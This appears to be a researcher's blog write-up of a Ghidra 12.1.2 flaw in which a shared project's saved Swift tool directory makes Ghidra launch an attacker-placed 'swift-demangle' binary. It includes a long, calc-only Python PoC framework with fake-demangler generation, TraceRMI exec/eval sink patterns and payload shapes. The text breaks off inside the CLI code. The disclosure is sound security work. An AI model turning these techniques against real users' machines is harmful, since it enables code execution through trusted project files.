---
hidden: true
icon: skull
cover: ../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 03_36_43 PM.png
coverY: 172.01328147885292
coverHeight: 331
---

# How I Found a 0-Day in Ghidra 12.1.2 , Shared Project File Became a Code Execution Vector.

<figure><img src="../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 04_52_30 PM.png" alt=""><figcaption></figcaption></figure>

## What If Opening Someone Else's Ghidra Project Could Run Code on Your Machine?

What if I told you that in Ghidra 12.1.2, a reverse engineer could open a project someone shared with them a teammate's CTF workspace, a file from GitHub, a downloaded case and that alone could silently execute arbitrary code on their machine?

No network connection required. No special privileges needed. No prompt, no warning, no indication anything happened. Just: open project → analysis runs → attacker binary executes.

That's the bug. Let me walk you through how I found it.

{% hint style="info" %}
At the time of discovery, Ghidra 12.1.2 was the latest stable release shipped June 5, 2026. This vulnerability was reported just one day after release, making it a true 0-day: unknown to the vendor, present in the newest version, unpatched, and with no CVE assigned. Every Ghidra user running 12.1.2 (the current version at the time) was affected. The NSA/Ghidra team accepted the report, fixed it in commit c03a70d, and the patch will ship in 12.1.3 meaning 12.1.2 remains the affected version for all users until that release lands.
{% endhint %}

***

### The Setup Why I Was Looking at Ghidra's Internals

Ghidra is the NSA's open-source reverse engineering framework. If you've done any serious binary analysis you've probably lived in it. It's also a massive Java codebase hundreds of analyzers that fire automatically when you open a binary. Each analyzer is a small program with its own config, its own state, and often its own interaction with external tools.

I was doing an independent code review of Ghidra 12.1.2 looking for code-execution conditions. Not web vulns, not logic bugs specifically looking for places where Ghidra might execute something it shouldn't, or where attacker-controlled input could reach a process-launch sink.

My working directory:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra]
└─$ ls -la
drwxr-xr-x  ghidra-12.1.2/       ← source tree
drwxr-xr-x  research/            ← my notes, poc scripts
-rw-r--r--  classification.md
-rw-r--r--  source-evidence.md
```

The game plan was simple: find analyzer code that interacts with native/external binaries, trace where the binary path comes from, and check if that path can be influenced by attacker-controlled input.

***

### Finding the Surface

Ghidra ships with an analyzer for Swift binaries specifically for demangling Swift symbol names. Swift mangling is complex enough that Ghidra delegates it to Apple's own `swift-demangle` binary rather than reimplementing it in Java.

I started looking at the analyzer's code. Here's the file that first caught my attention:

**`Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftDemanglerAnalyzer.java`**

The analyzer does two things that are immediately interesting:

1. It reads a `swiftToolDir` option a configurable path to where the Swift tools live
2. It passes that path to `SwiftNativeDemangler` which then launches the binary

```java
// SwiftDemanglerAnalyzer.java
String swiftDir = options.getString(SWIFT_TOOL_DIR_OPTION, null);
SwiftNativeDemangler demangler = new SwiftNativeDemangler(new File(swiftDir));
```

A configurable binary path. That's interesting. The question is _who can set that path?_

***

### Tracing the Sink

#### Following the Code into SwiftNativeDemangler

The actual process launch is in the sibling file:

**`Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftNativeDemangler.java`**

Here's the source-to-sink chain. This is the full execution path from config to shell:

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

So Ghidra calls the binary _twice_ once with `--version` to validate it exists, and once during actual symbol demangling. Whatever executable lives at `<swiftToolDir>/swift-demangle` gets run.

No hash check. No signature verification. No integrity check of any kind.

**Why this matters:** Any code sitting at that path will execute with full Ghidra process privileges. This is already a configurable code execution path but at this point I'm thinking "user misconfiguration." Then I dug into where the option actually comes from.

***

### The Real Vulnerability: Silent State Restoration

<figure><img src="../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 05_00_38 PM.png" alt=""><figcaption></figcaption></figure>

#### This Is the Part That Changes Everything

I went back to the analyzer and looked at how `SWIFT_TOOL_DIR_OPTION` gets populated. And here's where it gets interesting:

```java
// SwiftDemanglerAnalyzer.java
@Override
public void optionsChanged(Options options, Program program) {
    swiftToolDir = options.getString(SWIFT_TOOL_DIR_OPTION, "");
}
```

The analyzer doesn't ask you to configure the Swift directory every time. It reads from `options` which in Ghidra is the **saved analyzer state embedded inside the project file itself**.

This means:

1. A Ghidra `.gpr` project file (or the workspace it points to) can carry `SWIFT_TOOL_DIR_OPTION` baked in
2. When you open that project, Ghidra silently restores all analyzer options from the saved state
3. The Swift tool directory value is now set **without you ever seeing or configuring it**
4. When you run analysis, the Swift analyzer launches whatever binary is at that restored path

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

No prompt. No warning. Analysis just runs, and your code runs with it.

**Why this is the critical insight:** the Ghidra maintainer initially closed the report as "working as intended" thinking I was describing a user who had manually misconfigured their own Swift directory. Once I walked him through the project-import path showing that the attacker controls the state that gets silently loaded he immediately understood. His response:

> _"Thank you, I am seeing what you are describing now. I could restrict the analyzer to only call swift from the PATH, which would address this exact issue."_

That's when the report went from "won't fix" to an accepted finding with a committed patch.

***

### Building the PoC

#### The ghostmangle.py Framework

<details>

<summary>ghostmangle.py</summary>

```
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import logging
import os
import platform
import shutil
import subprocess
import sys
import zipfile
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import ClassVar, Optional, Sequence

# --------------------------------------------------------------------------- #
# Module constants
# --------------------------------------------------------------------------- #

AUTHOR = "sn0x-sharma"
TOOL_VERSION = "2.0.0"
MIN_PYTHON = (3, 9)

LOG = logging.getLogger("ghidra_research")


# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #

def configure_logging(verbose: bool) -> None:
    """Install a single stderr handler with timestamps.

    Logs go to stderr so that machine-readable artifacts written to disk stay
    the authoritative output; the console stream is purely operator narration.
    """
    handler = logging.StreamHandler(stream=sys.stderr)
    handler.setFormatter(
        logging.Formatter(
            fmt="%(asctime)s | %(levelname)-7s | %(message)s",
            datefmt="%H:%M:%S",
        )
    )
    LOG.handlers.clear()
    LOG.addHandler(handler)
    LOG.setLevel(logging.DEBUG if verbose else logging.INFO)


def stage(message: str) -> None:
    """Log a top-level workflow stage in a consistent, greppable form."""
    LOG.info("== %s ==", message)


# --------------------------------------------------------------------------- #
# Platform layer
# --------------------------------------------------------------------------- #

@dataclass(frozen=True)
class PlatformProfile:
    """All operating-system branching, resolved once and shared.

    Every component consults this object instead of calling
    ``platform.system()`` itself. Centralising it means the calc command,
    script header, executable-bit handling, and demangler filename all agree on
    a single detected platform for the whole run (deterministic behaviour).
    """

    system: str  # normalised, lower-case: "windows" | "darwin" | "linux" | ...

    # ClassVar, not a field: candidate Linux calculators are a shared constant,
    # so they must stay out of the generated __init__ / repr.
    _LINUX_CALCS: ClassVar[tuple[str, ...]] = (
        "xcalc",
        "gnome-calculator",
        "kcalc",
        "qalculate-gtk",
    )

    @classmethod
    def detect(cls) -> "PlatformProfile":
        """Build a profile from the running host."""
        return cls(system=platform.system().lower())

    # -- predicates -------------------------------------------------------- #
    @property
    def is_windows(self) -> bool:
        return self.system == "windows"

    @property
    def is_macos(self) -> bool:
        return self.system == "darwin"

    # -- Swift demangler simulation --------------------------------------- #
    @property
    def demangler_filename(self) -> str:
        """Name Ghidra would launch inside the configured Swift tool directory.

        A ``.cmd`` on Windows so the fake tool is directly executable there.
        """
        return "swift-demangle.cmd" if self.is_windows else "swift-demangle"

    @property
    def script_header(self) -> str:
        """Shebang / batch header for the generated fake demangler."""
        return "@echo off\n" if self.is_windows else "#!/bin/sh\n"

    def mark_executable(self, path: Path) -> None:
        """Set the executable bit (POSIX only; Windows keys off extension)."""
        if self.is_windows:
            return
        mode = path.stat().st_mode
        path.chmod(mode | 0o111)

    # -- calculator (benign "arbitrary process" marker) ------------------- #
    def calc_argv(self) -> Optional[list[str]]:
        """Return an argv that launches the platform calculator, or None.

        On Linux the first calculator actually present on ``PATH`` wins; if none
        is installed we return None and callers fall back to the disk marker as
        proof of execution.
        """
        if self.is_windows:
            return ["calc.exe"]
        if self.is_macos:
            return ["open", "-a", "Calculator"]
        for name in self._LINUX_CALCS:
            resolved = shutil.which(name)
            if resolved:
                return [resolved]
        return None

    def calc_shell_command(self) -> str:
        """Shell one-liner form, used inside generated scripts / payload shapes."""
        if self.is_windows:
            return "calc.exe"
        if self.is_macos:
            return "open -a Calculator"
        return " || ".join(self._LINUX_CALCS)

    def calc_python_eval_expression(self) -> str:
        """A calc-only Python expression, matching the LLDB ``pyeval`` sink shape."""
        if self.is_windows:
            args = "['calc.exe']"
        elif self.is_macos:
            args = "['open', '-a', 'Calculator']"
        else:
            args = f"['sh', '-lc', {self.calc_shell_command()!r}]"
        return f"__import__('subprocess').Popen({args})"

    def launch_calc(self) -> bool:
        """Spawn the platform calculator detached. True if a command was found."""
        argv = self.calc_argv()
        if argv is None:
            return False
        kwargs: dict = {}
        if self.is_windows:
            kwargs["creationflags"] = getattr(
                subprocess, "CREATE_NEW_PROCESS_GROUP", 0
            )
        subprocess.Popen(
            argv,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            **kwargs,
        )
        return True


# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #

@dataclass
class ResearchConfig:
    """Immutable-ish run configuration derived from the CLI.

    ``ghidra_source`` is optional because the Swift ACE component is fully
    self-contained (it fabricates its own fake tool), whereas the TraceRMI and
    SevenZip components need a real 12.1.2 source tree to produce evidence.
    """

    modes: tuple[str, ...]
    ghidra_source: Optional[Path]
    artifacts_dir: Path
    execute: bool
    launch_calc: bool
    create_harmless_zip: bool
    verbose: bool

    # ClassVar, not a field: the canonical mode order (deterministic, ACE
    # advisory first) is a shared constant, not per-instance configuration.
    ALL_MODES: ClassVar[tuple[str, ...]] = ("swift", "tracermi", "sevenzip")

    @staticmethod
    def resolve_source(explicit: Optional[Path]) -> Optional[Path]:
        """Locate a Ghidra 12.1.2 source tree.

        Precedence: explicit ``--ghidra-source`` > ``GHIDRA_SOURCE`` env >
        ``./ghidra-12.1.2`` > a sibling ``ghidra-12.1.2`` next to this repo.
        Returns the first path that exists, else None. This single resolver
        replaces the copy-pasted ``default_source()`` that lived in two scripts.
        """
        candidates: list[Path] = []
        if explicit:
            candidates.append(explicit)
        env_source = os.environ.get("GHIDRA_SOURCE")
        if env_source:
            candidates.append(Path(env_source))
        here = Path(__file__).resolve()
        candidates.append(Path.cwd() / "ghidra-12.1.2")
        candidates.append(here.parent / "ghidra-12.1.2")
        candidates.append(here.parent.parent / "ghidra-12.1.2")
        for candidate in candidates:
            if candidate.exists():
                return candidate.resolve()
        return None


# --------------------------------------------------------------------------- #
# Result model
# --------------------------------------------------------------------------- #

class Status(Enum):
    """Outcome of a single component run."""

    PASS = "pass"          # component executed and produced its expected evidence
    PARTIAL = "partial"    # ran, but some expected evidence was missing
    SKIPPED = "skipped"    # prerequisites not met (e.g. no source tree)
    ERROR = "error"        # unexpected failure


@dataclass
class ComponentResult:
    """Structured result returned by every research component.

    Components return data rather than printing; ``ReportGenerator`` owns all
    presentation. This is what makes the summary deterministic and lets the
    runner compute a meaningful process exit code.
    """

    name: str
    status: Status
    summary: str
    findings: list[str] = field(default_factory=list)
    artifacts: list[Path] = field(default_factory=list)


# --------------------------------------------------------------------------- #
# Evidence handling
# --------------------------------------------------------------------------- #

@dataclass
class SourceHit:
    """A single source-evidence match: ``relative_path:line`` and the text."""

    path: Path
    line: int
    needle: str
    text: str


class SourceScanner:
    """Read-only substring scanner over a Ghidra source tree.

    Consolidates the two different grep implementations the old scripts carried:
    a fixed-path lookup (SevenZip) and a recursive glob lookup (TraceRMI). Both
    now come from one audited primitive that reports 1-based line numbers.
    """

    def __init__(self, root: Path) -> None:
        self.root = root

    def locate(self, relative_path: str, needle: str) -> Optional[SourceHit]:
        """Find the first occurrence of ``needle`` in a specific file."""
        path = self.root / relative_path
        if not path.exists():
            return None
        text = path.read_text(encoding="utf-8", errors="replace")
        index = text.find(needle)
        if index < 0:
            return None
        line = text.count("\n", 0, index) + 1
        return SourceHit(Path(relative_path), line, needle, needle)

    def scan_glob(
        self,
        subdir: str,
        filename_glob: str,
        needles: Sequence[str],
    ) -> list[SourceHit]:
        """Recursively scan ``subdir`` for files matching ``filename_glob``.

        Returns every line containing any needle, sorted for deterministic
        output regardless of filesystem enumeration order.
        """
        base = self.root / subdir
        if not base.exists():
            raise FileNotFoundError(f"Expected source subtree not found: {base}")
        hits: list[SourceHit] = []
        for source_file in base.rglob(filename_glob):
            try:
                lines = source_file.read_text(
                    encoding="utf-8", errors="replace"
                ).splitlines()
            except OSError:
                continue
            for line_no, raw in enumerate(lines, start=1):
                stripped = raw.strip()
                for needle in needles:
                    if needle in stripped:
                        hits.append(
                            SourceHit(
                                source_file.relative_to(self.root),
                                line_no,
                                needle,
                                stripped,
                            )
                        )
        return sorted(hits, key=lambda h: (str(h.path), h.line, h.needle))


class EvidenceCollector:
    """Owns the ``artifacts/`` tree and records everything written to it.

    Separating evidence output from the components keeps generated artifacts
    cleanly out of source control (the whole tree is git-ignored) and gives the
    report a single, ordered list of produced files.
    """

    def __init__(self, root: Path) -> None:
        self.root = root
        self._artifacts: list[Path] = []

    def _subdir(self, name: str) -> Path:
        path = self.root / name
        path.mkdir(parents=True, exist_ok=True)
        return path

    def write_text(self, subdir: str, filename: str, content: str) -> Path:
        """Write a UTF-8 text artifact and remember it."""
        path = self._subdir(subdir) / filename
        if not content.endswith("\n"):
            content += "\n"
        path.write_text(content, encoding="utf-8")
        self.register(path)
        return path

    def create_harmless_zip(self, subdir: str, filename: str) -> Path:
        """Emit a benign ZIP used to exercise the archive-parser reachability.

        Deliberately contains one plain text file — no crafted headers, no
        exploit bytes — so it is safe to hand to any parser.
        """
        path = self._subdir(subdir) / filename
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                "hello.txt",
                "harmless sample for parser reachability checks\n",
            )
        self.register(path)
        return path

    def register(self, path: Path) -> None:
        """Record an artifact so the report can list it.

        Public because some artifacts are authored *outside* this collector —
        e.g. the fake Swift demangler writes its own marker — and still need to
        appear in the run summary. Idempotent: a path is recorded at most once.
        """
        if path not in self._artifacts:
            self._artifacts.append(path)
            LOG.debug("artifact written: %s", path)

    @property
    def artifacts(self) -> list[Path]:
        """All artifacts written this run, in creation order."""
        return list(self._artifacts)


# --------------------------------------------------------------------------- #
# Research components
# --------------------------------------------------------------------------- #

class ResearchComponent:
    """Base contract for a reviewed-surface component.

    ``requires_source`` lets the runner skip source-dependent components (and
    say why) when no Ghidra tree is available, instead of crashing.
    """

    name: str = "component"
    requires_source: bool = False

    def __init__(
        self,
        config: ResearchConfig,
        profile: PlatformProfile,
        evidence: EvidenceCollector,
        scanner: Optional[SourceScanner],
    ) -> None:
        self.config = config
        self.profile = profile
        self.evidence = evidence
        self.scanner = scanner

    def run(self) -> ComponentResult:  # pragma: no cover - interface method
        """Execute the component and return its structured result."""
        raise NotImplementedError


class SwiftAnalyzer(ResearchComponent):
    """Conditional ACE — the accepted Swift demangler advisory.

    Ghidra's Swift demangler analyzer restores a configured Swift tool directory
    and launches ``swift-demangle`` from it (once at validation with
    ``--version``, and again during symbol demangling). If that directory
    resolves to attacker-controlled content, Ghidra runs attacker code in the
    user's context.

    This component reproduces the *sink shape* without needing Ghidra: it writes
    a fake ``swift-demangle`` into a fake tool directory and, under ``--execute``,
    invokes it exactly as Ghidra would (``swift-demangle --version``). The fake
    tool drops a marker proving it ran; under ``--launch-calc`` the fake tool is
    the thing that spawns the calculator — because in the real bug the attacker
    binary is what executes, so the attacker binary is what should pop calc.
    """

    name = "swift-ace"
    requires_source = False

    def run(self) -> ComponentResult:
        """Stage the fake Swift tool and, under ``--execute``, launch it."""
        tool_dir = self.evidence.root / "swift-demangler-calc" / "fake-swift-bin"
        tool_dir.mkdir(parents=True, exist_ok=True)
        marker = (
            self.evidence.root
            / "swift-demangler-calc"
            / "swift_demangler_calc_marker.txt"
        )
        fake_tool = tool_dir / self.profile.demangler_filename

        self._write_fake_demangler(fake_tool, marker)

        findings = [
            f"Fake Swift tool directory: {tool_dir}",
            f"Fake demangler: {fake_tool}",
            "Simulated Ghidra launch: swift-demangle --version",
        ]

        if not self.config.execute:
            LOG.info("swift-ace: dry run (pass --execute to launch the fake tool)")
            return ComponentResult(
                name=self.name,
                status=Status.PASS,
                summary="Fake Swift demangler staged; not executed (dry run).",
                findings=findings,
                artifacts=[fake_tool],
            )

        LOG.info("swift-ace: launching fake demangler as Ghidra would")
        try:
            subprocess.run([str(fake_tool), "--version"], check=True)
        except (OSError, subprocess.CalledProcessError) as exc:
            return ComponentResult(
                name=self.name,
                status=Status.ERROR,
                summary=f"Fake demangler failed to execute: {exc}",
                findings=findings,
            )

        if not marker.exists():
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary="Fake demangler ran but did not drop its marker.",
                findings=findings,
                artifacts=[fake_tool],
            )
        self.evidence.register(marker)  # marker is authored by the fake tool
        findings.append(f"Execution marker: {marker}")

        if self.config.launch_calc:
            findings.append("Fake tool requested platform calculator launch.")

        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary="Swift demangler sink reproduced; attacker binary executed.",
            findings=findings,
            artifacts=[fake_tool, marker],
        )

    def _write_fake_demangler(self, fake_tool: Path, marker: Path) -> None:
        """Generate the stand-in ``swift-demangle`` executable.

        It echoes a banner, records the arguments Ghidra passed (proof of
        launch), and — only when calc is enabled — spawns the calculator so the
        launch is visibly demonstrated by the attacker-controlled tool itself.
        """
        lines = [self.profile.script_header]
        if self.profile.is_windows:
            lines.append("echo Swift demangler calc PoC (sn0x-sharma)\n")
            lines.append(f'echo ran with: %* > "{marker}"\n')
            if self.config.launch_calc:
                lines.append("start \"\" calc.exe\n")
        else:
            lines.append("echo 'Swift demangler calc PoC (sn0x-sharma)'\n")
            lines.append(f'printf "ran with: %s\\n" "$*" > "{marker}"\n')
            if self.config.launch_calc:
                lines.append(f"({self.profile.calc_shell_command()}) &\n")
        fake_tool.write_text("".join(lines), encoding="utf-8")
        self.profile.mark_executable(fake_tool)


class TraceManager(ResearchComponent):
    """Conditional RCE — TraceRMI debugger-agent command/eval sinks.

    The TraceRMI debugger agents expose methods that reach a command interpreter
    or a Python ``eval``:

      * GDB  ``execute(cmd)``  -> ``gdb.execute(cmd, ...)``
      * LLDB ``execute(cmd)``  -> LLDB command interpreter
      * LLDB ``pyeval(expr)``  -> Python ``eval(expr)``

    Once an untrusted peer can drive an already-created agent channel, those
    become code execution in the agent context. This component proves the sinks
    exist in the target source and emits *calc-only* payload shapes for the
    write-up. It never opens a channel or sends a command; the payload shapes are
    documentation, not a live exploit.
    """

    name = "tracermi-rce"
    requires_source = True

    _SINK_PATTERNS: tuple[str, ...] = (
        "def execute(",
        "gdb.execute(cmd",
        "exec_convert_errors(cmd",
        "def pyeval(",
        "return eval(expr)",
        "EvaluateExpression(expr)",
    )

    def run(self) -> ComponentResult:
        """Scan agent ``methods.py`` for exec/eval sinks and emit payload shapes."""
        assert self.scanner is not None  # guaranteed by requires_source gate
        LOG.info("tracermi-rce: scanning Ghidra/Debug for agent sinks")
        try:
            hits = self.scanner.scan_glob("Ghidra/Debug", "methods.py", self._SINK_PATTERNS)
        except FileNotFoundError as exc:
            return ComponentResult(
                name=self.name,
                status=Status.SKIPPED,
                summary=str(exc),
            )

        if not hits:
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary="No execution-capable TraceRMI agent sinks were found.",
            )

        findings = [f"{h.path}:{h.line}: {h.text}" for h in hits]

        shapes = self._payload_shapes()
        shapes_artifact = self.evidence.write_text(
            "tracermi-conditional-rce",
            "tracermi_calc_payload_shapes.txt",
            "\n".join(shapes),
        )
        artifacts = [shapes_artifact]

        if self.config.execute and self.config.launch_calc:
            marker = self.evidence.write_text(
                "tracermi-conditional-rce",
                "tracermi_local_calc_marker.txt",
                "local calc demo ran",
            )
            artifacts.append(marker)
            if self.profile.launch_calc():
                findings.append("Local calculator launched as sink demonstration.")
            else:
                findings.append("No calculator found; marker proves local execution.")

        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary=f"Found {len(hits)} TraceRMI execution-capable sink line(s).",
            findings=findings,
            artifacts=artifacts,
        )

    def _payload_shapes(self) -> list[str]:
        """Calc-only command shapes, one per confirmed sink type."""
        shell = self.profile.calc_shell_command()
        return [
            f"GDB execute(cmd) calc-only command: shell {shell}",
            f"LLDB execute(cmd) calc-only command: platform shell {shell}",
            f"LLDB pyeval(expr) calc-only expression: "
            f"{self.profile.calc_python_eval_expression()}",
        ]


class SevenZipProbe(ResearchComponent):
    """RCE-class native parser reachability — SevenZipJBinding.

    Ghidra 12.1.2 bundles SevenZipJBinding 16.02-era native code and routes
    recognised archive bytes into it in-process. This is an RCE-*class* surface
    (reverse engineers routinely open untrusted archives/firmware), but this
    component makes no code-execution claim: it only proves the source-level
    reachability chain and, optionally, emits a benign ZIP plus a pointer to the
    optional JVM runtime probe.
    """

    name = "sevenzip-reachability"
    requires_source = True

    # (label, relative source path, substring that proves the link)
    _CHECKS: tuple[tuple[str, str, str], ...] = (
        (
            "SevenZipJBinding dependency",
            "Ghidra/Features/FileFormats/build.gradle",
            "sevenzipjbinding:16.02-2.01",
        ),
        (
            "SevenZip all-platforms dependency",
            "Ghidra/Features/FileFormats/build.gradle",
            "sevenzipjbinding-all-platforms:16.02-2.01",
        ),
        (
            "Archive probe path",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystemFactory.java",
            "probeStartBytes",
        ),
        (
            "SevenZip file system mount",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystemFactory.java",
            "new SevenZipFileSystem",
        ),
        (
            "Native archive open",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystem.java",
            "SevenZip.openInArchive",
        ),
        (
            "Native library load",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipCustomInitializer.java",
            "System.load",
        ),
        (
            "ZIP tries SevenZip path",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "zip/ZipFileSystemFactory.java",
            "SevenZipFileSystemFactory.initNativeLibraries",
        ),
    )

    def run(self) -> ComponentResult:
        """Confirm the source-level native-parser reachability chain."""
        assert self.scanner is not None
        LOG.info("sevenzip-reachability: verifying native parser reachability chain")

        findings: list[str] = []
        missing = 0
        for label, rel_path, needle in self._CHECKS:
            hit = self.scanner.locate(rel_path, needle)
            if hit is None:
                findings.append(f"[miss]  {label}: {rel_path}")
                missing += 1
            else:
                findings.append(f"[found] {label}: {hit.path}:{hit.line}")

        artifacts: list[Path] = []
        if self.config.create_harmless_zip:
            sample = self.evidence.create_harmless_zip(
                "sevenzip-reachability", "harmless-sevenzip-sample.zip"
            )
            artifacts.append(sample)
            findings.append(f"Benign ZIP sample: {sample}")

        probe = Path(__file__).resolve().parent / "probes" / "SevenZipReachabilityProbe.java"
        if probe.exists():
            findings.append(f"Optional JVM runtime probe available: {probe}")

        if missing:
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary=f"{len(self._CHECKS) - missing}/{len(self._CHECKS)} "
                "reachability links confirmed.",
                findings=findings,
                artifacts=artifacts,
            )
        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary="Full SevenZipJBinding native-parser reachability chain confirmed.",
            findings=findings,
            artifacts=artifacts,
        )


# --------------------------------------------------------------------------- #
# Environment validation
# --------------------------------------------------------------------------- #

@dataclass
class EnvironmentReport:
    """Outcome of pre-flight validation."""

    ok: bool
    notes: list[str] = field(default_factory=list)


class EnvironmentValidator:
    """Pre-flight checks run before any component executes.

    Fails fast and loudly on hard blockers (Python version), and records soft
    notes (missing source tree, no calculator installed) so the operator learns
    up front why a mode will be skipped or why calc launch may no-op.
    """

    def __init__(self, config: ResearchConfig, profile: PlatformProfile) -> None:
        self.config = config
        self.profile = profile

    def validate(self, components: Sequence[ResearchComponent]) -> EnvironmentReport:
        stage("validating environment")
        report = EnvironmentReport(ok=True)

        if sys.version_info < MIN_PYTHON:
            report.ok = False
            report.notes.append(
                f"Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]}+ required, "
                f"found {sys.version_info.major}.{sys.version_info.minor}."
            )
            LOG.error(report.notes[-1])
            return report

        LOG.debug("Python %s on %s", platform.python_version(), self.profile.system)

        needs_source = any(c.requires_source for c in components)
        if needs_source:
            if self.config.ghidra_source is None:
                note = (
                    "No Ghidra 12.1.2 source tree found; source-dependent modes "
                    "(tracermi, sevenzip) will be skipped. Pass --ghidra-source "
                    "or set GHIDRA_SOURCE."
                )
                report.notes.append(note)
                LOG.warning(note)
            else:
                LOG.info("Ghidra source: %s", self.config.ghidra_source)

        if self.config.launch_calc and self.profile.calc_argv() is None:
            note = (
                "No platform calculator on PATH; calc launch will no-op "
                "(markers still prove execution)."
            )
            report.notes.append(note)
            LOG.warning(note)

        return report


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #

class ReportGenerator:
    """Renders the final summary to the log and to a text artifact.

    Presentation lives here (and only here) so component output stays pure data
    and the summary is deterministic across runs and platforms.
    """

    def __init__(self, evidence: EvidenceCollector) -> None:
        self.evidence = evidence

    def generate(self, results: Sequence[ComponentResult]) -> Path:
        stage("generating summary")
        lines: list[str] = [
            f"Ghidra 12.1.2 research summary (tool {TOOL_VERSION}, {AUTHOR})",
            "=" * 64,
        ]
        for result in results:
            lines.append("")
            lines.append(f"[{result.status.value.upper():7}] {result.name}: {result.summary}")
            for finding in result.findings:
                lines.append(f"    - {finding}")

        artifacts = self.evidence.artifacts
        if artifacts:
            lines.append("")
            lines.append("Artifacts written:")
            for path in artifacts:
                lines.append(f"    - {path}")

        summary_text = "\n".join(lines)
        for line in summary_text.splitlines():
            LOG.info(line)

        return self.evidence.write_text("", "summary.txt", summary_text)


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #

class ResearchRunner:
    """Top-level orchestrator: validate -> run selected components -> report.

    Owns component construction (so mode selection lives in one place), enforces
    per-component prerequisites, and translates results into a process exit code
    (0 = every selected component passed / cleanly skipped, non-zero otherwise).
    """

    _REGISTRY = {
        "swift": SwiftAnalyzer,
        "tracermi": TraceManager,
        "sevenzip": SevenZipProbe,
    }

    def __init__(self, config: ResearchConfig) -> None:
        self.config = config
        self.profile = PlatformProfile.detect()
        self.evidence = EvidenceCollector(config.artifacts_dir)
        self.scanner = (
            SourceScanner(config.ghidra_source) if config.ghidra_source else None
        )

    def _build_components(self) -> list[ResearchComponent]:
        components: list[ResearchComponent] = []
        for mode in self.config.modes:
            component_cls = self._REGISTRY[mode]
            components.append(
                component_cls(self.config, self.profile, self.evidence, self.scanner)
            )
        return components

    def run(self) -> int:
        stage("checking prerequisites")
        components = self._build_components()

        env = EnvironmentValidator(self.config, self.profile).validate(components)
        if not env.ok:
            LOG.error("Environment validation failed; aborting.")
            return 3

        stage("running research components")
        results: list[ComponentResult] = []
        for component in components:
            if component.requires_source and self.scanner is None:
                LOG.warning("%s: skipped (no Ghidra source tree)", component.name)
                results.append(
                    ComponentResult(
                        name=component.name,
                        status=Status.SKIPPED,
                        summary="Skipped: no Ghidra source tree available.",
                    )
                )
                continue
            LOG.info("running component: %s", component.name)
            try:
                results.append(component.run())
            except Exception as exc:  # defensive: one bad component must not abort the run
                LOG.exception("%s raised an unexpected error", component.name)
                results.append(
                    ComponentResult(
                        name=component.name,
                        status=Status.ERROR,
                        summary=f"Unhandled error: {exc}",
                    )
                )

        stage("collecting evidence")
        ReportGenerator(self.evidence).generate(results)

        return self._exit_code(results)

    @staticmethod
    def _exit_code(results: Sequence[ComponentResult]) -> int:
        """0 only if nothing errored or came back partial; 2 otherwise."""
        if any(r.status in (Status.ERROR, Status.PARTIAL) for r in results):
            return 2
        return 0


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    """Construct the command-line interface.

    One entrypoint, one ``--mode`` selector, and two clearly-gated action flags
    (``--execute`` / ``--launch-calc``). Everything defaults to the safest
    behaviour: report-only, no process launches.
    """
    parser = argparse.ArgumentParser(
        prog="research_poc.py",
        description=(
            "Ghidra 12.1.2 responsible-disclosure research framework "
            f"(v{TOOL_VERSION}, by {AUTHOR}). Consolidates the Swift demangler "
            "ACE, TraceRMI conditional RCE, and SevenZipJBinding parser "
            "reachability research into one auditable tool."
        ),
        epilog=(
            "Research modes:\n"
            "  swift     Conditional ACE via the Swift demangler launch sink "
            "(the accepted advisory). Self-contained; no Ghidra source needed.\n"
            "  tracermi  Conditional RCE evidence for TraceRMI agent exec/eval "
            "sinks. Requires a Ghidra 12.1.2 source tree.\n"
            "  sevenzip  Native archive-parser reachability chain. Requires a "
            "Ghidra 12.1.2 source tree.\n"
            "  all       Run every applicable mode (default).\n\n"
            "Nothing dangerous runs unless you opt in with --execute and "
            "--launch-calc."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--mode",
        choices=(*ResearchConfig.ALL_MODES, "all"),
        default="all",
        help="Which research surface to exercise (default: all).",
    )
    parser.add_argument(
        "--ghidra-source",
        type=Path,
        default=None,
        metavar="PATH",
        help="Path to a Ghidra 12.1.2 source tree (else uses $GHIDRA_SOURCE "
        "or a nearby ghidra-12.1.2 directory).",
    )
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        default=Path(__file__).resolve().parent / "artifacts",
        metavar="PATH",
        help="Directory for generated evidence (default: ./artifacts).",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Actually launch local sinks (e.g. the fake swift-demangle). "
        "Without this, staging is dry-run only.",
    )
    parser.add_argument(
        "--launch-calc",
        action="store_true",
